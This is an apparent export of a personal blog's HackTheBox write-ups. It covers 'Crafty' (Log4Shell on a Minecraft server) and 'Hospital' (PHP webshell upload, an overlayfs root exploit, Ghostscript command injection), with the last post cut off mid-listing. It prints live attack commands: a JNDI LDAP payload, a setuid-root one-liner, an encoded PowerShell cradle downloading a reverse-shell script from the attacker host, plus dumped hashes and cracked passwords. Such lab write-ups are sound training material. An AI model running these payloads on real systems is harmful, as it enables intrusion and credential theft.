Bing.url| || \\---Links+---Links| Desktop.lnk| Downloads.lnk|+---Music+---Pictures| crocc-crew-wallpaper.png|+---Saved Games+---Searches\\---Videos*Evil-WinRM* PS C:\\Users\\Administrator>```{: .nolineno}I am Domain Admin Now !> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Crafty", "url": "/posts/Crafty/", "categories": "HackTheBox", "tags": "log4j, Public Exploit, minecraft, RunAsCs, PrivEsc", "date": "2024-04-27 00:00:00 +0530", "snippet": "| Machine Link | [https://app.hackthebox.com/machines/Crafty](https://app.hackthebox.com/machines/Crafty) || ------------------ | -------------------------------------------...", "content": "| Machine Link | [https://app.hackthebox.com/machines/Crafty](https://app.hackthebox.com/machines/Crafty) || ------------------ | ---------------------------------------------------------------------------------------------------------- || Operating System | Windows || Difficulty | Easy || Machine Created by | [TheCyberGeek](https://app.hackthebox.com/users/114053)&Â [felamos](https://app.hackthebox.com/users/27390) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Crafty]â””â”€$ sudo rustscan -a 10.10.11.249 --ulimit 5000 -- -Pn -sV .----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-''The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------[~] The config file is expected to be at \"/root/.rustscan.toml\"[~] Automatically increasing ulimit value to 5000.Open 10.10.11.249:80Open 10.10.11.249:25565[~] Starting Script(s)[>] Script to be run Some(\"nmap -vvv -p {{port}} {{ip}}\")Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.[~] Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-04-14 13:42 ISTPORT STATE SERVICE REASON VERSION80/tcp open http syn-ack ttl 127 Microsoft IIS httpd 10.025565/tcp open minecraft syn-ack ttl 127 Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 0/100)Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows```{: .nolineno}## Web Enumeration â¤µï¸While checking port 80 I get redirected to this domain name **crafty.htb** so I set the /etc/hosts file .![Image](Pasted%20image%2020240414124255.png)_Front Page_I then also noticed port `25565` open for minecraft 1.16.5 I recon about it on internet and found a famous vulnerability **log4j** .I got this exploit from web enumeration â¬[Log4j Exploit](https://github.com/kozmer/log4j-shell-poc?source=post_page-----ddac7de10847--------------------------------)[_Log4j_](https://logging.apache.org/log4j/2.x/)Â is a widely used logging library in Java applications, includingÂ [_Minecraft_](https://www.minecraft.net/en-us)Â servers. In December 2021, a critical vulnerability, dubbed â€œLog4Shellâ€ orÂ [_CVE-2021â€“44228_](https://nvd.nist.gov/vuln/detail/CVE-2021-44228), was discovered in Log4j. This vulnerability allowed attackers to execute arbitrary code remotely, leading to potential server compromises.For this exploit to run I should have `jdk1.8.0_20` installed and running on this attacker machine so for that I followed its GitHub page instructions to install it.But here are some steps that will help you to install the java file into the linux system â¬```bash#Login as rootsudo su#create jdk directorymkdir /opt/jdk#uncompress, change to your file nametar -zxf jdk-8u5-linux-x64.tar.gz -C /opt/jdk#check if files are therels /opt/jdk#update alternatives so the command java point to the new jdk update-alternatives --install /usr/bin/java java /opt/jdk/jdk1.8.0_05/bin/java 100#update alternatives so the command javac point to the new jdk update-alternatives --install /usr/bin/javac javac /opt/jdk/jdk1.8.0_05/bin/javac 100#check if java command is pointing to \" link currently points to /opt/jdk/jdk1.8.0_05/bin/java\"update-alternatives --display java#check if java command is pointing to \" link currently points to /opt/jdk/jdk1.8.0_05/bin/javac\"update-alternatives --display javac# It could be the last step if your java version doesn't change (show and choose from list alternatives) sudo update-alternatives --config java#check if java is runningjava -version```{: .nolineno}So As I installed the java now its time to run the `minecraft` game on linux machine and for that I went to this site â¬![Image](Pasted%20image%2020240414125055.png)_Download from here : https://tlauncher.org/en/_```bashsudo unzip sudo java -jar TLauncher-*.jar```{: .nolineno}Select the same version , that is given fron victim machine while port scan version 1.16.5 no any other version.Then Enter any name and hit Enter.![Image](Pasted%20image%2020240414125547.png)_Select the version of minecraft as 1.16.5_![Image](Pasted%20image%2020240414133417.png)_Multiplayer option_Now you will have 2 options to include you victim machine server .- Direct connection- Add Server![Image](Pasted%20image%2020240414125758.png)_Options to setup the game server_I choose **Direct Connection** option and Entered the machines IP and Clicked on Join Server and I am in.![Image](Pasted%20image%2020240414112956.png)_Server Connection_I am inside the game now â¬![Image](Pasted%20image%2020240414113158.png)Now press 'T' to enable comment section and now you can enter the comment to another user.Lets run this exploit now , but wait a sec I need to make some changes into the exploit like what to execute while running this exploit cmd.exe .![Image](Pasted%20image%2020240414132422.png)_poc.py file_Now lets run this exploit â¬```bashpython3 log4j-shell-poc/poc.py --userip 10.10.14.36 --webport 80 --lport 445```{: .nolineno}![Image](Pasted%20image%2020240413153516.png)_Reverse Shell from log4j exploit_![Image](Pasted%20image%2020240414133719.png)_Enter the ldap server command ${jndi:ldap://10.10.14.36:1389/a}_As I connect to the reverse shell now let explore further .While Enumeration I found this `jar` file interesting so I tried to download it but can't able to with smb share.```powershellc:\\users\\svc_minecraft\\server>tree /f /atree /f /aFolder PATH listingVolume serial number is C419-63F6C:.| banned-ips.json| banned-players.json| eula.txt| ops.json| server.jar| server.properties| usercache.json| whitelist.json| +---logs| 2023-10-24-1.log.gz| 2023-10-24-2.log.gz| 2023-10-24-3.log.gz| 2023-10-24-4.log.gz| 2023-10-26-1.log.gz| 2023-10-28-1.log.gz| 2023-10-28-2.log.gz| 2023-11-14-1.log.gz| 2023-11-14-2.log.gz| 2023-11-14-3.log.gz| 2023-11-14-4.log.gz| 2023-11-21-1.log.gz| 2023-11-21-2.log.gz| 2023-11-21-3.log.gz| 2023-11-21-4.log.gz| 2023-11-22-1.log.gz| 2023-11-22-2.log.gz| 2023-11-22-3.log.gz| 2024-02-05-1.log.gz| 2024-02-05-2.log.gz| 2024-02-05-3.log.gz| 2024-02-05-4.log.gz| 2024-02-06-1.log.gz| 2024-02-06-2.log.gz| 2024-02-06-3.log.gz| latest.log| +---plugins| playercounter-1.0-SNAPSHOT.jar| \\---world | level.dat | level.dat_old | session.lock | +---advancements | 079b5404-947e-3c1f-aa3e-6bd947fa1c48.json | +---data | raids.dat | +---datapacks +---DIM-1 | \\---data | raids.dat | +---DIM1 | \\---data | raids_end.dat | +---playerdata | 079b5404-947e-3c1f-aa3e-6bd947fa1c48.dat | +---poi | r.-1.-1.mca | r.-1.0.mca | r.0.-1.mca | r.0.0.mca | +---region | r.-1.-1.mca | r.-1.0.mca | r.0.-1.mca | r.0.0.mca | r.1.-1.mca | r.1.0.mca | \\---stats 079b5404-947e-3c1f-aa3e-6bd947fa1c48.json c:\\users\\svc_minecraft\\server>cd pluginscd pluginsc:\\Users\\svc_minecraft\\server\\plugins>dirdir Volume in drive C has no label. Volume Serial Number is C419-63F6 Directory of c:\\Users\\svc_minecraft\\server\\plugins10/27/2023 02:48 PM .10/27/2023 02:48 PM ..10/27/2023 02:48 PM 9,996 playercounter-1.0-SNAPSHOT.jar 1 File(s) 9,996 bytes 2 Dir(s) 3,832,041,472 bytes freec:\\Users\\svc_minecraft\\server\\plugins>```{: .nolineno}Now I transfered nc.exe executable file into the victim machine so that that will help me transfer the `playercounter-1.0-SNAPSHOT.jar` file.On Attackers Linux machine I stated listener on port 4444.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Crafty]â””â”€$ nc -lvp 4444 > playercounter-1.0-SNAPSHOT.jar listening on [any] 4444 ...connect to [10.10.14.36] from crafty.htb [10.10.11.249] 49712```{: .nolineno}On Victim Windows machine , my transfer command will be â¬```powershellc:\\Users\\svc_minecraft\\Desktop>nc.exe 10.10.14.36 4444 .\\RunasCs.exe Administrator s67u84zKq8IXw \"cmd /c whoami /all\".\\RunasCs.exe Administrator s67u84zKq8IXw \"cmd /c whoami /all\"USER INFORMATION----------------User Name SID ==================== ======================================crafty\\administrator S-1-5-21-4088429403-1159899800-2753317549-500GROUP INFORMATION-----------------Group Name Type SID Attributes ============================================================= ================ ============ ========================================================Everyone Well-known group S-1-1-0 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account and member of Administrators group Well-known group S-1-5-114 Mandatory group, Enabled by default, Enabled group BUILTIN\\Administrators Alias S-1-5-32-544 Mandatory group, Enabled by default, Enabled group, Group ownerBUILTIN\\Remote Management Users Alias S-1-5-32-580 Mandatory group, Enabled by default, Enabled group BUILTIN\\Users Alias S-1-5-32-545 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\INTERACTIVE Well-known group S-1-5-4 Mandatory group, Enabled by default, Enabled group CONSOLE LOGON Well-known group S-1-2-1 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Authenticated Users Well-known group S-1-5-11 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\This Organization Well-known group S-1-5-15 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\Local account Well-known group S-1-5-113 Mandatory group, Enabled by default, Enabled group NT AUTHORITY\\NTLM Authentication Well-known group S-1-5-64-10 Mandatory group, Enabled by default, Enabled group Mandatory Label\\High Mandatory Level Label S-1-16-12288 PRIVILEGES INFORMATION----------------------Privilege Name Description State ========================================= ================================================================== =SeIncreaseQuotaPrivilege Adjust memory quotas for a process DisabledSeSecurityPrivilege Manage auditing and security log DisabledSeTakeOwnershipPrivilege Take ownership of files or other objects DisabledSeLoadDriverPrivilege Load and unload device drivers DisabledSeSystemProfilePrivilege Profile system performance DisabledSeSystemtimePrivilege Change the system time DisabledSeProfileSingleProcessPrivilege Profile single process DisabledSeIncreaseBasePriorityPrivilege Increase scheduling priority DisabledSeCreatePagefilePrivilege Create a pagefile DisabledSeBackupPrivilege Back up files and directories DisabledSeRestorePrivilege Restore files and directories DisabledSeShutdownPrivilege Shut down the system DisabledSeDebugPrivilege Debug programs DisabledSeSystemEnvironmentPrivilege Modify firmware environment values DisabledSeChangeNotifyPrivilege Bypass traverse checking Enabled SeRemoteShutdownPrivilege Force shutdown from a remote system DisabledSeUndockPrivilege Remove computer from docking station DisabledSeManageVolumePrivilege Perform volume maintenance tasks DisabledSeImpersonatePrivilege Impersonate a client after authentication Enabled SeCreateGlobalPrivilege Create global objects Enabled SeIncreaseWorkingSetPrivilege Increase a process working set DisabledSeTimeZonePrivilege Change the time zone DisabledSeCreateSymbolicLinkPrivilege Create symbolic links DisabledSeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session DisabledPS C:\\Users\\svc_minecraft\\Desktop>```{: .nolineno}Now lets have a reverse shell since I have nc.exe executable on this machine so lets use it to have a shell â¬![Image](Pasted%20image%2020240414121841.png)_RunAsCs Command for reverse shell using nc Tool_```powershellC:\\Windows\\system32>cd C:\\Users\\Administratorcd C:\\Users\\AdministratorC:\\Users\\Administrator>C:\\Users\\Administrator>tree /f /atree /f /aFolder PATH listingVolume serial number is C419-63F6C:.+---3D Objects+---Contacts+---Desktop| root.txt| +---Documents+---Downloads+---Favorites| | Bing.url| | | \\---Links+---Links| Desktop.lnk| Downloads.lnk| +---Music+---Pictures+---Saved Games+---Searches\\---VideosC:\\Users\\Administrator>type Desktop\\root.txttype Desktop\\root.txt84b9f35ddcbe0a82f8479cbf76d6fd54C:\\Users\\Administrator>```{: .nolineno}I am Administrator Now !!> If you have any questions or suggestions, please leave a comment below.> Thank You ! {: .prompt-tip }" }, { "title": "Hospital", "url": "/posts/Hospital/", "categories": "HackTheBox", "tags": "PrivEsc, Public Exploit, Ghostscript, File Upload, Windows", "date": "2024-04-03 00:00:00 +0530", "snippet": "| Machine Link | [https://app.hackthebox.com/machines/Hospital](https://app.hackthebox.com/machines/Hospital) || ------------------ | ---------------------------------------------------------...", "content": "| Machine Link | [https://app.hackthebox.com/machines/Hospital](https://app.hackthebox.com/machines/Hospital) || ------------------ | -------------------------------------------------------------------------------------------- || Operating System | Windows + Linux || Difficulty | Medium || Machine Created by | [ruycr4ft](https://app.hackthebox.com/users/1253217) |## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Hospital]â””â”€$ sudo nmap -sC -sV -T4 -p- -oN Nmap_Results.txt 10.10.11.241Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-15 13:05 ISTNmap scan report for 10.10.11.241Host is up (0.29s latency).Not shown: 65506 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)|_ 256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)53/tcp open domain Simple DNS Plus88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2024-02-15 14:44:47Z)135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb| Not valid before: 2023-09-06T10:49:03|_Not valid after: 2028-09-06T10:49:03443/tcp open ssl/http Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)| tls-alpn: |_ http/1.1|_http-title: Hospital Webmail :: Welcome to Hospital Webmail|_ssl-date: TLS randomness does not represent time|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28| ssl-cert: Subject: commonName=localhost| Not valid before: 2009-11-10T23:48:47|_Not valid after: 2019-11-08T23:48:47445/tcp open microsoft-ds?464/tcp open kpasswd5?593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0636/tcp open ldapssl?| ssl-cert: Subject: commonName=DC| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb| Not valid before: 2023-09-06T10:49:03|_Not valid after: 2028-09-06T10:49:031801/tcp open msmq?2103/tcp open msrpc Microsoft Windows RPC2105/tcp open msrpc Microsoft Windows RPC2107/tcp open msrpc Microsoft Windows RPC2179/tcp open vmrdp?3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)| ssl-cert: Subject: commonName=DC| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb| Not valid before: 2023-09-06T10:49:03|_Not valid after: 2028-09-06T10:49:033269/tcp open globalcatLDAPssl?| ssl-cert: Subject: commonName=DC| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb| Not valid before: 2023-09-06T10:49:03|_Not valid after: 2028-09-06T10:49:033389/tcp open ms-wbt-server Microsoft Terminal Services| rdp-ntlm-info: | Target_Name: HOSPITAL| NetBIOS_Domain_Name: HOSPITAL| NetBIOS_Computer_Name: DC| DNS_Domain_Name: hospital.htb| DNS_Computer_Name: DC.hospital.htb| DNS_Tree_Name: hospital.htb| Product_Version: 10.0.17763|_ System_Time: 2024-02-15T14:45:46+00:00| ssl-cert: Subject: commonName=DC.hospital.htb| Not valid before: 2024-02-05T12:02:41|_Not valid after: 2024-08-06T12:02:415985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found6056/tcp open msrpc Microsoft Windows RPC6404/tcp open msrpc Microsoft Windows RPC6406/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.06407/tcp open msrpc Microsoft Windows RPC6409/tcp open msrpc Microsoft Windows RPC6615/tcp open msrpc Microsoft Windows RPC6635/tcp open msrpc Microsoft Windows RPC8080/tcp open http Apache httpd 2.4.55|_http-title: 403 Forbidden|_http-server-header: Apache/2.4.55 (Ubuntu)9389/tcp open mc-nmf .NET Message FramingService Info: Hosts: DC, 127.0.1.1; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windowsHost script results:| smb2-time: | date: 2024-02-15T14:45:44|_ start_date: N/A|_clock-skew: mean: 6h59m48s, deviation: 0s, median: 6h59m47s| smb2-security-mode: | 3:1:1: |_ Message signing enabled and required```{: .nolineno}{: file='Nmap_Results.txt' .nolineno}## Web Enumeration â¤µï¸I enumerated port 443 and got this login page where the default credentials where not working .![Image](Pasted%20image%2020240215134246.png)_Checking port 443_I then checked port 8080 and got this login page again but this time I have the options to register myself like this â¤µï¸ ![Image](Pasted%20image%2020240219152613.png)_Register Page at port 8080_![Image](Pasted%20image%2020240219152756.png)_My Login credentials will be my username strongshiv8_Now I have an option to upload a file so lets exploit that functionality lets see its file upload is vulnerable or not â¬![Image](Pasted%20image%2020240219152911.png)_Upload a document over here !_I uploaded the php webshell file and changed its extension to phar as it gets bypass sometimes and also works that's why.Looks like it got uploaded ðŸ”»![Image](Pasted%20image%2020240219153357.png)_Uploaded successfully !_Lets load the files I think I can find this file in `/upload/` directory : ![Image](Pasted%20image%2020240219153707.png)_Restricted by the server_So I guessed that I should try to load the file name with it also and I got it ðŸ”½![Image](Pasted%20image%2020240219153844.png)_PHP Webshell by p0wnyshell_Now lets have a proper shell with reverse shell through netcat command â¬```phpwww-data@webserver:/var/www/html$ cat config.phpcat config.phpwww-data@webserver:/var/www/html$ ```{: .nolineno}I got the credentials for mysql service lets move further â¬I logged into the mysql server and got this data from hospital database â¬```sqlMariaDB [hospital]> select * from users;select * from users;+----+-------------+--------------------------------------------------------------+---------------------+| id | username | password | created_at |+----+-------------+--------------------------------------------------------------+---------------------+| 1 | admin | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 || 2 | patient | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 || 3 | harlock | $2y$10$24OV/426MYhewTzI66fkSui9MTJjvtvOWVuOYglwrqN/.vmzR4W9i | 2024-02-13 15:58:40 || 4 | regis | $2y$10$AjjBmzMwKOQvJlXxHd6tvu3jdH7opxjZfMPIa1KYIOKZjduM18Ch. | 2024-02-13 21:03:03 || 5 | M4d2 | $2y$10$KwaY2owXUM/IHIaSpQTxH.CTV22wxng/J9.fjYta394syRLKub3cO | 2024-02-14 02:38:47 || 6 | Z43L | $2y$10$45xTJMMOxYJkGfez4eO5geE6Wru7s0UGlaZ2KYX08FHfgT85gD6H. | 2024-02-14 03:01:35 || 7 | Z43Lz | $2y$10$kM2QMx9xJPWcWFBGJD/w1eT3/p3WZ58.8fraEe.Ul9d.L6vHByCKW | 2024-02-14 03:07:13 || 8 | post | $2y$10$HnPpvRldaJWTKHKp2m9xduAv..KSK3b0brL0BfKWqZ8LYTzHmRtcW | 2024-02-14 03:29:23 || 9 | test | $2y$10$CaLia00lbvrMfxDzQZQlW.4dfTjCmdTds7fvnADLuKOSyh2YUc8UC | 2024-02-14 17:12:20 || 10 | hacker | $2y$10$YLYDbRnYO6p8aVX5oVW3ne0q7szENOqxxaMaR384o8XH3v.2nOD86 | 2024-02-14 17:24:54 || 11 | pwned | $2y$10$Y25Ty3H3Crqw0NtYCt9NguG9iaBD..fXPsBNcVT6esnQ00Ycu2s0O | 2024-02-14 17:33:54 || 12 | deadpoop | $2y$10$1MnUbxgFnMsg6J1efOqQdeiyPWMBg1fTED7E0Tkz8XcHfG9/zWoVK | 2024-02-14 18:31:34 || 13 | madz | $2y$10$NuS.66jXERxZMDePQKsIT.Qd6AsdLs5b07Uk4VG/ETc1hlF8YNwQm | 2024-02-16 00:32:34 || 14 | admin121 | $2y$10$nP5qLBm82ZALvbYSHL3Qxuo3X4/Q8l4Y5XTp4W6z6S4zs4DH6NBtO | 2024-02-16 14:00:19 || 15 | admin1 | $2y$10$4/Aq.uoTbL1ATFb9uB5AVuK7LnltPUUXUfPsr16hxbG2c5bD8PtZW | 2024-02-16 17:34:39 || 16 | z43lzzzz | $2y$10$evBzhCXKWgq4o1wcURk6a.bUKR8tELPwLauN3s7krZKaUzt9k1VMa | 2024-02-17 01:17:42 || 17 | kali | $2y$10$olcQ8Y7yWy07id9vIJvEBe8SghKo4wPqCybIp5HJAi0IQizZsqTmm | 2024-02-18 18:04:33 || 18 | 12301230aa | $2y$10$IipXHcnm7S.ltguRckRea.OkWDjZxFTRHarkTMgFENx02fitTbTxq | 2024-02-18 23:10:13 || 19 | user | $2y$10$lraCdCzRutTxtUs3vIqBy.SlQBkK369CGSa3.TC8IXlAoUpBn2hzS | 2024-02-19 01:40:22 || 20 | user2 | $2y$10$JxXppT.H0hISyuXQvBPLPOmeMaaSOeh5E9oHmsWCVsnR4jDfn05WG | 2024-02-19 02:03:01 || 21 | jeffer | $2y$10$kGFiHcbkziSG5srhLVbKlO4exHMKglXIqYqDfq4pXF2.Bdr6t8g1S | 2024-02-19 04:03:41 || 22 | strongshiv8 | $2y$10$utQztY9JIt0jkFmznWziQOmjgA1TbmPxz7sQDShnqkz6AmEdmo1ei | 2024-02-19 16:57:05 |+----+-------------+--------------------------------------------------------------+---------------------+22 rows in set (0.001 sec)MariaDB [hospital]> ```{: .nolineno}I stored these data in `credentials.txt` file then extracted the hashes from decryption into another file and the usernames in another file like this : ```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Hospital]â””â”€$ cat credentials.txt| cut -d '|' -f 4 | sed \"s/ //g\" > hashes.txt```{: .nolineno}and the usernames like this â¬```bashâ”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Hospital]â””â”€$ cat credentials.txt| cut -d '|' -f 3 | sed \"s/ //g\" > usernames.txt â”Œâ”€â”€(kaliðŸ”¥kali)-[~/Downloads/HTB/Hospital]â””â”€$ cat usernames.txt adminpatientharlockregis......```{: .nolineno}I checked the kernel version and on web I found this version is vulnerable to this `CVE-2023-2640` & `CVE-2023-32629` and so I tried these CVE's exploit from here â¬https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/I got this code working fine â¬```bashunshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\\\"id\\\")'\"```{: .nolineno}I tried on this system and I got this result ðŸ”½![Image](Pasted%20image%2020240219163645.png)_The command of id as root user is working_Lets try to get the root shell with making the bash with SUIDs permission : ```bashwww-data@webserver:/dev/shm$ unsharunshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\\\"cp /bin/bash /var/tmp/dash && chmod 4755 /var/tmp/dash && /var/tmp/dash -p && rm -rf l m u w /var/tmp/dash\\\")'\"unshare -rm sh -c \"mkdir l u w m && cp /u*/b*/p*3 l/;> setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*; u/python3 -c 'import os;os.setuid(0);os.system(\\\"cp /bin/bash /var/tmp/dash && chmod 4755 /var/tmp/dash && /var/tmp/dash -p && rm -rf l m u w /var/tmp/dash\\\")'\"dash: /root/.bashrc: Permission deniedroot@webserver:/dev/shm# whoamiwhoamirootroot@webserver:/dev/shm# root@webserver:/dev/shm# cd /rootcd /rootdash: cd: /root: Permission deniedroot@webserver:/dev/shm# ididuid=0(root) gid=0(root) groups=0(root)root@webserver:/dev/shm# cd /root/cd /root/dash: cd: /root/: Permission deniedroot@webserver:/dev/shm# ls -al /var/tmp/dashls -al /var/tmp/dash-rwsr-xr-x 1 root root 1437832 Feb 19 18:23 /var/tmp/dashroot@webserver:/dev/shm#```{: .nolineno}Now lets see the users and there password from the shadow file â¬```bashroot@webserver:/dev/shm# cat /ecat /etc/shadowcat /etc/shadowroot:$y$j9T$s/Aqv48x449udndpLC6eC.$WUkrXgkW46N4xdpnhMoax7US.JgyJSeobZ1dzDs..dD:19612:0:99999:7:::daemon:*:19462:0:99999:7:::bin:*:19462:0:99999:7:::sys:*:19462:0:99999:7:::sync:*:19462:0:99999:7:::games:*:19462:0:99999:7:::man:*:19462:0:99999:7:::lp:*:19462:0:99999:7:::mail:*:19462:0:99999:7:::news:*:19462:0:99999:7:::uucp:*:19462:0:99999:7:::proxy:*:19462:0:99999:7:::www-data:*:19462:0:99999:7:::backup:*:19462:0:99999:7:::list:*:19462:0:99999:7:::irc:*:19462:0:99999:7:::_apt:*:19462:0:99999:7:::nobody:*:19462:0:99999:7:::systemd-network:!*:19462::::::systemd-timesync:!*:19462::::::messagebus:!:19462::::::systemd-resolve:!*:19462::::::pollinate:!:19462::::::sshd:!:19462::::::syslog:!:19462::::::uuidd:!:19462::::::tcpdump:!:19462::::::tss:!:19462::::::landscape:!:19462::::::fwupd-refresh:!:19462::::::drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::lxd:!:19612::::::mysql:!:19620::::::root@webserver:/dev/shm# ```{: .nolineno}I got the password hash for user `drwilliams` and I decoded it through [hashes.com](https://hashes.com/en/decrypt/hash) site and I got the password â¬![Image](Pasted%20image%2020240219172719.png)```textdrwilliams : qwe123!@#```{: .nolineno}Now I also tried to login into the port 443 Hospital site with this credentials and I got in â¬![Image](Pasted%20image%2020240219172901.png)_Dashboard works as mail system_A mail stated this information : ![Image](Pasted%20image%2020240219173121.png)_Mail from drbrown to Lucy stated about the ghostscript !_This means I have to create a payload in `.eps` format that will be execute after uploading it.So I found 1 exploit that works as Command Injection and will generate the payload in `.eps` format.##### [CVE-2023-36664: Command injection with Ghostscript PoC + exploit](https://www.vicarius.io/vsociety/posts/cve-2023-36664-command-injection-with-ghostscript-poc-exploit)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Hospital]â””â”€$ python3 exploit.py --generate --payload 'cmd.exe /c powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA=' --filename run --extension eps```{: .nolineno}Now the payload is created so lets upload it as a attachment of a mail and wait for its execution of this payload from machine â¬![Image](Pasted%20image%2020240426135633.png)I have to wait a while so that the payload of `ghostscript` works on the system â¬![Image](Pasted%20image%2020240426141337.png)_Got the reverse Shell_Lets talk about above pictures Points â¬1. I generated a powershell payload that is encoded with UTF16 little endian that works for windows system + base64 encoded it.```bashecho -n 'IEX(New-Object Net.WebClient).downloadString(\"http://10.10.16.18/Invoke-PowerShellTcp.ps1\")'| iconv --to-code UTF-16LE | base64 -w 0SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA=```{: .nolineno}2. Then I ran the exploit and generated the exploit file named as run.eps.```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Hospital]â””â”€$ python3 exploit.py --generate --payload 'cmd.exe /c powershell -EncodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4AZABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAIgBoAHQAdABwADoALwAvADEAMAAuADEAMAAuADEANgAuADEAOAAvAEkAbgB2AG8AawBlAC0AUABvAHcAZQByAFMAaABlAGwAbABUAGMAcAAuAHAAcwAxACIAKQA=' --filename run --extension eps [+] Generated EPS payload file: run.eps```{: .nolineno}3. I started the python http server on port 80 where the exploit will download it and execute it.4. This is a netcat listener on port 445 where I will be capturing this revere shell.Let dig deeper and after some enumeration I found nothing to exploit .So I checked xmpp server and its directory htdocs . If this folder have the permissions to add a file ,Then this file that will be appended into this directory can give me `nt\\authority system` user shell.![Image](Pasted%20image%2020240426144558.png)_Reverse Shell file execution lets to shell_```powershellC:\\xampp\\htdocs>whoamint authority\\systemC:\\xampp\\htdocs>cd C:\\Users\\AdministratorC:\\Users\\Administrator>tree /f/ aParameter format not correct - /f/C:\\Users\\Administrator>tree /f /aFolder PATH listingVolume serial number is 7357-966FC:.+---.cache| \\---selenium| | se-metadata.json| | | \\---IEDriverServer| \\---win32| \\---4.14.0| IEDriverServer.exe| +---.dotnet| | 7.0.400.aspNetCertificateSentinel| | 7.0.400.dotnetFirstUseSentinel| | 7.0.400.toolpath.sentinel| | 7.0.400_IsDockerContainer.dotnetUserLevelCache| | 7.0.400_MachineId.dotnetUserLevelCache| | MachineId.v1.dotnetUserLevelCache| | | \\---TelemetryStorageService| 20230907145524_35f147a68ca74125843c0c427356e016.trn| 